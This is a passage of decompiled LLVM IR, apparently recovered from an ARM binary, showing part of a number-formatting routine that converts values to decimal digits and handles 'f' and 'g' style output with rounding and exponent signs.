  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_1360c = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_1360c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_13614 = xor i1 %v6_13600, %v5_13600
  %v4_13614 = or i1 %v7_13600, %v3_13614
  br i1 %v4_13614, label %dec_label_pc_13620, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_135fc
  %v7_13614137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_13614137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_13620:                               ; preds = %dec_label_pc_135fc
  %v2_13620 = ptrtoint i32* %stack_var_-82 to i32
  %v2_13624 = add i32 %v1_13624, %v2_13620
  store i32 %v2_13624, i32* %r3.global-to-local, align 4
  %v1_13628 = add i32 %v2_13624, 2
  %v2_13628 = inttoptr i32 %v1_13628 to i8*
  %v3_13628 = load i8, i8* %v2_13628, align 1
  %v4_13628 = zext i8 %v3_13628 to i32
  store i32 %v4_13628, i32* %r2.global-to-local, align 4
  store i32 %v1_13628, i32* %r1.global-to-local, align 4
  %v2_13630 = icmp ugt i8 %v3_13628, 51
  %v7_13630 = icmp eq i8 %v3_13628, 52
  store i1 %v7_13630, i1* %cpsr_z.global-to-local, align 1
  %v2_13634 = xor i1 %v2_13630, true
  %v3_13634 = or i1 %v7_13630, %v2_13634
  br i1 %v3_13634, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_13620
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_13620, %bb222
  %v1_1364090 = phi i32 [ %v1_1364092, %dec_label_pc_13620 ], [ 0, %bb222 ]
  %v2_13638 = xor i1 %v7_13630, true
  %v3_13638 = and i1 %v2_13630, %v2_13638
  br i1 %v3_13638, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_1363c = phi i32 [ %v0_1363c.pre, %._crit_edge87 ], [ %v7_13614137141, %.thread140 ], [ %v1_13628, %bb223 ], [ %v1_13628, %bb224 ]
  %v1_13640 = phi i32 [ %v1_13640.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_1364090, %bb223 ], [ 1, %bb224 ]
  %v1_1363c = add i32 %v0_1363c, -1
  %v2_1363c = inttoptr i32 %v1_1363c to i8*
  %v3_1363c = load i8, i8* %v2_1363c, align 1
  %v4_1363c = zext i8 %v3_1363c to i32
  store i32 %v1_1363c, i32* %r1.global-to-local, align 4
  %v2_13640 = add i32 %v4_1363c, %v1_13640
  %v1_13644 = urem i32 %v2_13640, 256
  store i32 %v1_13644, i32* %r3.global-to-local, align 4
  %v2_13648 = icmp ugt i32 %v1_13644, 56
  %v7_13648 = icmp eq i32 %v1_13644, 57
  store i1 %v7_13648, i1* %cpsr_z.global-to-local, align 1
  %v2_1364c = xor i1 %v2_13648, true
  %v3_1364c = or i1 %v7_13648, %v2_1364c
  br i1 %v3_1364c, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_13650 = xor i1 %v7_13648, true
  %v3_13650 = and i1 %v2_13648, %v2_13650
  br i1 %v3_13650, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_13658.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_13658 = phi i32 [ %v1_13658.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_13654 = icmp eq i32 %v1_13644, 48
  store i1 %v7_13654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13654, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_13658 = or i32 %v1_13658, 1
  store i32 %v2_13658, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_1365c = phi i32 [ 1, %bb229 ], [ %v1_13658, %bb228 ]
  %v2_1365c = icmp eq i32 %v0_1365c, 0
  store i1 %v2_1365c, i1* %cpsr_z.global-to-local, align 1
  %v1_13660 = trunc i32 %v2_13640 to i8
  store i8 %v1_13660, i8* %v2_1363c, align 1
  %v0_13664 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13664, label %dec_label_pc_13668, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_13640.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_1363c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_13668:                               ; preds = %._crit_edge93
  store i32 %v2_1360c, i32* %r2.global-to-local, align 4
  %v2_1366c = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_1366c, i32* %r3.global-to-local, align 4
  %v0_13670 = load i32, i32* %r1.global-to-local, align 4
  %v3_13670 = icmp uge i32 %v0_13670, %v2_1366c
  %v9_13670 = icmp eq i32 %v0_13670, %v2_1366c
  store i1 %v9_13670, i1* %cpsr_z.global-to-local, align 1
  %v2_13674 = xor i1 %v3_13670, true
  %v3_13674 = or i1 %v9_13670, %v2_13674
  br i1 %v3_13674, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_13668
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_1366c, i32* %r2.global-to-local, align 4
  store i32 %v2_1366c, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_13668, %bb230
  %v2_13694 = phi i32 [ %v2_1366c, %bb230 ], [ %v0_13670, %dec_label_pc_13668 ]
  %v4_13688144 = phi i32 [ %v2_1366c, %bb230 ], [ %v2_1360c, %dec_label_pc_13668 ]
  %v2_13680 = xor i1 %v9_13670, true
  %v3_13680 = and i1 %v3_13670, %v2_13680
  br i1 %v3_13680, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_13674, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_13684 = load i32, i32* @lr, align 4
  %v5_13684 = add i32 %v4_13684, 1
  store i32 %v5_13684, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_13680, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_13688 = add i32 %v4_13688144, 2
  store i32 %v5_13688, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_13690 = load i32, i32* %sb.global-to-local, align 4
  %v7_13690 = icmp eq i32 %v0_13690, 103
  store i1 %v7_13690, i1* %cpsr_z.global-to-local, align 1
  %v3_13694 = add i32 %v2_13694, 1
  %v4_13694 = inttoptr i32 %v3_13694 to i8*
  store i8 0, i8* %v4_13694, align 1
  %v0_13698 = load i32, i32* %r1.global-to-local, align 4
  %v1_13698 = add i32 %v0_13698, 1
  store i32 %v1_13698, i32* %lr.global-to-local, align 4
  %v0_1369c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1369c, label %dec_label_pc_136a0, label %dec_label_pc_136c8

dec_label_pc_136a0:                               ; preds = %bb236
  %v0_136a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_136a0 = load i32, i32* %ip.global-to-local, align 4
  %v2_136a0 = sub i32 %v0_136a0, %v1_136a0
  %v4_136a0 = xor i32 %v1_136a0, %v0_136a0
  %v5_136a0 = xor i32 %v2_136a0, %v0_136a0
  %v6_136a0 = and i32 %v5_136a0, %v4_136a0
  %v7_136a0 = icmp slt i32 %v6_136a0, 0
  %v8_136a0 = icmp slt i32 %v2_136a0, 0
  %v9_136a0 = icmp eq i32 %v0_136a0, %v1_136a0
  %v3_136a4 = xor i1 %v8_136a0, %v7_136a0
  %v4_136a4 = or i1 %v9_136a0, %v3_136a4
  %.258 = zext i1 %v4_136a4 to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_136ac = add i32 %v0_136a0, 4
  %v3_136ac = sub i32 0, %v0_136a0
  %v4_136ac = and i32 %v1_136ac, %v3_136ac
  %v5_136ac = icmp slt i32 %v4_136ac, 0
  %v6_136ac = icmp slt i32 %v1_136ac, 0
  %v7_136ac = icmp eq i32 %v1_136ac, 0
  store i1 %v7_136ac, i1* %cpsr_z.global-to-local, align 1
  %v2_136b0 = xor i1 %v6_136ac, %v5_136ac
  br i1 %v2_136b0, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_136a0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_139e4

bb239:                                            ; preds = %dec_label_pc_136a0
  %v2_136b4 = icmp eq i1 %v4_136a4, false
  store i1 %v2_136b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_136b4, label %dec_label_pc_139e4, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_136b8 = sub i32 %v1_136a0, %v0_136a0
  store i32 %v3_136b8, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_136d4

dec_label_pc_136c8:                               ; preds = %bb236
  %v0_136c8 = load i32, i32* %sb.global-to-local, align 4
  %v7_136c8 = icmp eq i32 %v0_136c8, 102
  store i1 %v7_136c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_136c8, i32* %r8.global-to-local, align 4
  br i1 %v7_136c8, label %dec_label_pc_136c8.dec_label_pc_136d4_crit_edge, label %dec_label_pc_136e4

dec_label_pc_136c8.dec_label_pc_136d4_crit_edge:  ; preds = %dec_label_pc_136c8
  %v0_136d4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_136d4

dec_label_pc_136d4:                               ; preds = %.thread24, %dec_label_pc_136c8.dec_label_pc_136d4_crit_edge
  %v0_136d4 = phi i32 [ %v0_136d4.pre, %dec_label_pc_136c8.dec_label_pc_136d4_crit_edge ], [ %v0_136a0, %.thread24 ]
  %v1_136d4 = icmp slt i32 %v0_136d4, 0
  %v2_136d4 = icmp eq i32 %v0_136d4, 0
  store i1 %v2_136d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_136d4, label %bb240, label %dec_label_pc_136e4

bb240:                                            ; preds = %dec_label_pc_136d4
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_136dc = load i32, i32* %r2.global-to-local, align 4
  %v6_136dc = add i32 %v5_136dc, -1
  %v7_136dc = inttoptr i32 %v6_136dc to i8*
  store i8 48, i8* %v7_136dc, align 1
  %v8_136dc = load i32, i32* %r2.global-to-local, align 4
  %v9_136dc = add i32 %v8_136dc, -1
  store i32 %v9_136dc, i32* %r2.global-to-local, align 4
  %v0_136e0.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_13714.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_136e4

dec_label_pc_136e4:                               ; preds = %bb240, %dec_label_pc_136d4, %dec_label_pc_139e4, %dec_label_pc_136c8
  %v1_13714 = phi i32 [ %v1_13698, %dec_label_pc_136c8 ], [ %v1_13698, %dec_label_pc_139e4 ], [ %v1_13714.pre.pre, %bb240 ], [ %v1_13698, %dec_label_pc_136d4 ]
  %v1_1378c30 = phi i32 [ 0, %dec_label_pc_136c8 ], [ 0, %dec_label_pc_139e4 ], [ %v0_136e0.pre, %bb240 ], [ %v0_136d4, %dec_label_pc_136d4 ]
  store i32 %v1_1378c30, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_136f0 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_136f0, i32* %r3.global-to-local, align 4
  %v0_136fc = load i32, i32* %r2.global-to-local, align 4
  %v1_136fc = inttoptr i32 %v0_136fc to i8*
  %v2_136fc = load i8, i8* %v1_136fc, align 1
  %v3_136fc = zext i8 %v2_136fc to i32
  store i32 %v3_136fc, i32* %r3.global-to-local, align 4
  %v5_136fc = add i32 %v0_136fc, 1
  store i32 %v5_136fc, i32* %r2.global-to-local, align 4
  %v1_13700 = icmp slt i32 %v1_1378c30, 0
  %v2_13700 = icmp eq i32 %v1_1378c30, 0
  store i1 %v2_13700, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_136fc, i32* %r6.global-to-local, align 4
  store i32 %v3_136fc, i32* %stack_var_-42, align 4
  %v2_13714 = sub i32 %v1_13714, %v5_136fc
  store i32 %v2_13714, i32* %ip.global-to-local, align 4
  br i1 %v1_13700, label %.thread, label %dec_label_pc_13720

.thread:                                          ; preds = %dec_label_pc_136e4
  %v5_13718 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_13718, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1379c

dec_label_pc_13720:                               ; preds = %dec_label_pc_136e4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_13724 = sub i32 %v1_1378c30, %v2_13714
  %v4_13724 = xor i32 %v2_13714, %v1_1378c30
  %v5_13724 = xor i32 %v2_13724, %v1_1378c30
  %v6_13724 = and i32 %v5_13724, %v4_13724
  %v7_13724 = icmp slt i32 %v6_13724, 0
  %v8_13724 = icmp slt i32 %v2_13724, 0
  %v9_13724 = icmp eq i32 %v1_1378c30, %v2_13714
  store i1 %v9_13724, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_13730 = xor i1 %v8_13724, %v7_13724
  br i1 %v2_13730, label %dec_label_pc_1377c, label %dec_label_pc_13734

dec_label_pc_13734:                               ; preds = %dec_label_pc_13720
  store i32 %v2_13724, i32* %r2.global-to-local, align 4
  %v2_13738 = icmp eq i32 %v2_13724, 0
  store i1 %v2_13738, i1* %cpsr_z.global-to-local, align 1
  %v2_1373c = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1373c, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_13724, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_13750

.thread148:                                       ; preds = %dec_label_pc_13734
  %v7_13744 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_13744, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_13750:                               ; preds = %dec_label_pc_13734
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34125), i32* %r3.global-to-local, align 4
  %v2_13760 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_13760, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_1379c

dec_label_pc_1377c:                               ; preds = %dec_label_pc_13720
  store i1 %v2_13700, i1* %cpsr_z.global-to-local, align 1
  %v2_13780 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_13780, i32* %lr.global-to-local, align 4
  br i1 %v2_13700, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_1377c
  %v3_13788 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_13788, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_1377c
  %v3_1378c = sub i32 %v2_13714, %v1_1378c30
  store i32 %v3_1378c, i32* %ip.global-to-local, align 4
  %v3_1379063 = add i32 %v5_136fc, %v1_1378c30
  store i32 %v3_1379063, i32* %r6.global-to-local, align 4
  %v3_13794 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_13794, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_137dc265 = phi i32 [ %v3_13788, %bb242 ], [ %v3_13794, %bb243 ], [ %v7_13744, %.thread148 ]
  %v0_137b0102 = phi i32 [ %v2_13714, %bb242 ], [ %v3_1378c, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1379c

dec_label_pc_1379c:                               ; preds = %.thread, %dec_label_pc_13750, %.thread34
  %v1_137dc = phi i32 [ %v2_13760, %dec_label_pc_13750 ], [ %v1_137dc265, %.thread34 ], [ %v5_13718, %.thread ]
  %v0_137f0109 = phi i32 [ -1, %dec_label_pc_13750 ], [ -1, %.thread34 ], [ %v1_1378c30, %.thread ]
  %v0_137b0 = phi i32 [ 0, %dec_label_pc_13750 ], [ %v0_137b0102, %.thread34 ], [ %v2_13714, %.thread ]
  %v3_1379c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1379c, i32* %r2.global-to-local, align 4
  %v1_137a0 = add i32 %v3_1379c, 12
  %v2_137a0 = inttoptr i32 %v1_137a0 to i32*
  %v3_137a0 = load i32, i32* %v2_137a0, align 4
  %v1_137a4 = and i32 %v3_137a0, 16
  store i32 %v1_137a4, i32* %r4.global-to-local, align 4
  %v2_137a4 = icmp eq i32 %v1_137a4, 0
  %tmp270 = zext i1 %v2_137a4 to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_137b0 = icmp eq i32 %v0_137b0, 0
  store i1 %v2_137b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_137b0, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_1379c
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_137cc

bb246:                                            ; preds = %dec_label_pc_1379c
  store i1 %v2_137a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_137a4, label %dec_label_pc_137c0, label %dec_label_pc_137cc

dec_label_pc_137c0:                               ; preds = %bb246
  %v0_137c0 = load i32, i32* %sb.global-to-local, align 4
  %v7_137c0 = icmp eq i32 %v0_137c0, 103
  store i1 %v7_137c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_137c0, label %dec_label_pc_137f0, label %bb247

bb247:                                            ; preds = %dec_label_pc_137c0
  %v1_137c4 = load i32, i32* %fp.global-to-local, align 4
  %v3_137c4 = icmp eq i32 %v1_137c4, 0
  store i1 %v3_137c4, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_137c4, 1
  br i1 %tmp248, label %dec_label_pc_137f0, label %dec_label_pc_137cc

dec_label_pc_137cc:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34128), i32* %r3.global-to-local, align 4
  %v2_137dc = inttoptr i32 %v1_137dc to i32*
  store i32 112, i32* %v2_137dc, align 4
  %v0_137e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_137e0 = add i32 %v0_137e0, 16
  store i32 %v1_137e0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_137e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_137e8 = add i32 %v0_137e8, 4
  %v2_137e8 = inttoptr i32 %v1_137e8 to i32*
  store i32 1, i32* %v2_137e8, align 4
  %v4_137e8 = add i32 %v0_137e8, 8
  %v5_137e8 = inttoptr i32 %v4_137e8 to i32*
  %v6_137e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_137e8, i32* %v5_137e8, align 4
  %v0_137ec = load i32, i32* %r7.global-to-local, align 4
  %v1_137ec = add i32 %v0_137ec, 12
  store i32 %v1_137ec, i32* %r7.global-to-local, align 4
  %v0_137f0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_137f0

dec_label_pc_137f0:                               ; preds = %dec_label_pc_137c0, %bb247, %dec_label_pc_137cc
  %v1_13810 = phi i32 [ %v1_137dc, %bb247 ], [ %v1_137ec, %dec_label_pc_137cc ], [ %v1_137dc, %dec_label_pc_137c0 ]
  %v0_137f0 = phi i32 [ %v0_137f0109, %bb247 ], [ %v0_137f0.pre, %dec_label_pc_137cc ], [ %v0_137f0109, %dec_label_pc_137c0 ]
  %v1_137f0 = add i32 %v0_137f0, 1
  store i32 %v1_137f0, i32* %lr.global-to-local, align 4
  %v6_137f0 = icmp slt i32 %v1_137f0, 0
  %v7_137f0 = icmp eq i32 %v1_137f0, 0
  store i1 %v7_137f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_137f0, label %dec_label_pc_137f8, label %dec_label_pc_1381c

dec_label_pc_137f8:                               ; preds = %dec_label_pc_137f0
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34125), i32* %r3.global-to-local, align 4
  %v1_13808 = sub i32 -1, %v0_137f0
  store i32 %v1_13808, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_13810 = inttoptr i32 %v1_13810 to i32*
  store i32 176, i32* %v2_13810, align 4
  %v0_13814 = load i32, i32* %r7.global-to-local, align 4
  %v1_13814 = add i32 %v0_13814, 4
  %v2_13814 = inttoptr i32 %v1_13814 to i32*
  %v3_13814 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_13814, i32* %v2_13814, align 4
  %v4_13814 = add i32 %v0_13814, 8
  %v5_13814 = inttoptr i32 %v4_13814 to i32*
  %v6_13814 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_13814, i32* %v5_13814, align 4
  %v0_13818 = load i32, i32* %r7.global-to-local, align 4
  %v1_13818 = add i32 %v0_13818, 12
  store i32 %v1_13818, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1381c

dec_label_pc_1381c:                               ; preds = %dec_label_pc_137f0, %dec_label_pc_137f8
  %v2_13824 = phi i32 [ %v1_13810, %dec_label_pc_137f0 ], [ %v1_13818, %dec_label_pc_137f8 ]
  %v0_1381c = load i32, i32* %ip.global-to-local, align 4
  %v2_1381c = icmp eq i32 %v0_1381c, 0
  store i1 %v2_1381c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1381c, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_1381c
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_13824 = inttoptr i32 %v2_13824 to i32*
  store i32 112, i32* %v3_13824, align 4
  %v1_13828 = load i32, i32* %r6.global-to-local, align 4
  %v2_13828 = load i32, i32* %r7.global-to-local, align 4
  %v3_13828 = add i32 %v2_13828, 8
  %v4_13828 = inttoptr i32 %v3_13828 to i32*
  store i32 %v1_13828, i32* %v4_13828, align 4
  %v1_1382c = load i32, i32* %ip.global-to-local, align 4
  %v2_1382c = load i32, i32* %r7.global-to-local, align 4
  %v3_1382c = add i32 %v2_1382c, 4
  %v4_1382c = inttoptr i32 %v3_1382c to i32*
  store i32 %v1_1382c, i32* %v4_1382c, align 4
  %v1_13830 = load i32, i32* %r7.global-to-local, align 4
  %v2_13830 = add i32 %v1_13830, 12
  store i32 %v2_13830, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_1381c, %bb249
  %v1_13868 = phi i32 [ %v2_13824, %dec_label_pc_1381c ], [ %v2_13830, %bb249 ]
  %v0_13834 = load i32, i32* %sb.global-to-local, align 4
  %v7_13834 = icmp eq i32 %v0_13834, 103
  store i1 %v7_13834, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13834, label %dec_label_pc_1383c, label %dec_label_pc_13844

dec_label_pc_1383c:                               ; preds = %.thread46
  %v0_1383c = load i32, i32* %r4.global-to-local, align 4
  %v2_1383c = icmp eq i32 %v0_1383c, 0
  store i1 %v2_1383c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1383c, label %dec_label_pc_13874, label %dec_label_pc_13844

dec_label_pc_13844:                               ; preds = %.thread46, %dec_label_pc_1383c
  %v0_13844 = load i32, i32* %lr.global-to-local, align 4
  %v1_13844 = load i32, i32* %ip.global-to-local, align 4
  %v2_13844 = sub i32 %v1_13844, %v0_13844
  store i32 %v2_13844, i32* %r1.global-to-local, align 4
  %v1_13848 = load i32, i32* %fp.global-to-local, align 4
  %v2_13848 = sub i32 %v2_13844, %v1_13848
  %v4_13848 = xor i32 %v1_13848, %v2_13844
  %v5_13848 = xor i32 %v2_13848, %v2_13844
  %v6_13848 = and i32 %v5_13848, %v4_13848
  %v7_13848 = icmp slt i32 %v6_13848, 0
  %v8_13848 = icmp slt i32 %v2_13848, 0
  %v9_13848 = icmp eq i32 %v2_13844, %v1_13848
  store i1 %v9_13848, i1* %cpsr_z.global-to-local, align 1
  %v2_1384c = xor i1 %v8_13848, %v7_13848
  br i1 %v2_1384c, label %dec_label_pc_13850, label %dec_label_pc_13874

dec_label_pc_13850:                               ; preds = %dec_label_pc_13844
  %v2_1385c = sub i32 %v1_13848, %v2_13844
  store i32 %v2_1385c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -34125), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_13868 = inttoptr i32 %v1_13868 to i32*
  store i32 176, i32* %v2_13868, align 4
  %v0_1386c = load i32, i32* %r7.global-to-local, align 4
  %v1_1386c = add i32 %v0_1386c, 4
  %v2_1386c = inttoptr i32 %v1_1386c to i32*
  %v3_1386c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1386c, i32* %v2_1386c, align 4
  %v4_1386c = add i32 %v0_1386c, 8
  %v5_1386c = inttoptr i32 %v4_1386c to i32*
  %v6_1386c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1386c, i32* %v5_1386c, align 4
  %v0_13870 = load i32, i32* %r7.global-to-local, align 4
  %v1_13870 = add i32 %v0_13870, 12
  store i32 %v1_13870, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13874

dec_label_pc_13874:                               ; preds = %dec_label_pc_13844, %dec_label_pc_1383c, %dec_label_pc_13850
  %v1_13908.pre.pre = phi i32 [ %v1_13868, %dec_label_pc_13844 ], [ %v1_13868, %dec_label_pc_1383c ], [ %v1_13870, %dec_label_pc_13850 ]
  %v0_13874 = load i32, i32* %r8.global-to-local, align 4
  %v7_13874 = icmp eq i32 %v0_13874, 102
  store i1 %v7_13874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13874, label %dec_label_pc_138fc, label %dec_label_pc_1387c

dec_label_pc_1387c:                               ; preds = %dec_label_pc_13874
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_13880 = load i32, i32* %r0.global-to-local, align 4
  %v1_13880 = icmp slt i32 %v0_13880, 0
  %v2_13880 = icmp eq i32 %v0_13880, 0
  store i1 %v2_13880, i1* %cpsr_z.global-to-local, align 1
  %v4_13884 = select i1 %tmp275, i32 %v4_135a0126130, i32 101
  store i32 %v4_13884, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_13894 = sub i32 0, %v0_13880
  %storemerge158 = select i1 %v1_13880, i32 %v4_13894, i32 %v0_13880
  %tmp271 = ashr i32 %v0_13880, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_1389c = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_1389c, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_138a4

dec_label_pc_138a4:                               ; preds = %dec_label_pc_138d4, %dec_label_pc_138a4, %dec_label_pc_1387c
  %v2_138bc = phi i32 [ %v2_1389c, %dec_label_pc_1387c ], [ %v6_138bc, %dec_label_pc_138a4 ], [ %v6_138bc, %dec_label_pc_138d4 ]
  %v0_138b4 = phi i32 [ %storemerge158, %dec_label_pc_1387c ], [ %v2_138c0, %dec_label_pc_138a4 ], [ %v2_138c0, %dec_label_pc_138d4 ]
  %v3_138ac = urem i32 %v0_138b4, 10
  %v1_138b0 = or i32 %v3_138ac, 48
  store i32 %v1_138b0, i32* %r3.global-to-local, align 4
  store i32 %v0_138b4, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_138bc = trunc i32 %v1_138b0 to i8
  %v3_138bc = add i32 %v2_138bc, -1
  %v4_138bc = inttoptr i32 %v3_138bc to i8*
  store i8 %v1_138bc, i8* %v4_138bc, align 1
  %v5_138bc = load i32, i32* %r6.global-to-local, align 4
  %v6_138bc = add i32 %v5_138bc, -1
  store i32 %v6_138bc, i32* %r6.global-to-local, align 4
  %v0_138c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_138c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_138c0 = sdiv i32 %v0_138c0, %v1_138c0
  store i32 %v2_138c0, i32* %r0.global-to-local, align 4
  %v0_138c4 = load i32, i32* %r8.global-to-local, align 4
  %v1_138c4 = add i32 %v0_138c4, 1
  store i32 %v1_138c4, i32* %r8.global-to-local, align 4
  %v7_138c8 = icmp eq i32 %v1_138c4, 3
  store i1 %v7_138c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_138c0, i32* %r5.global-to-local, align 4
  br i1 %v7_138c8, label %dec_label_pc_138a4, label %dec_label_pc_138d4

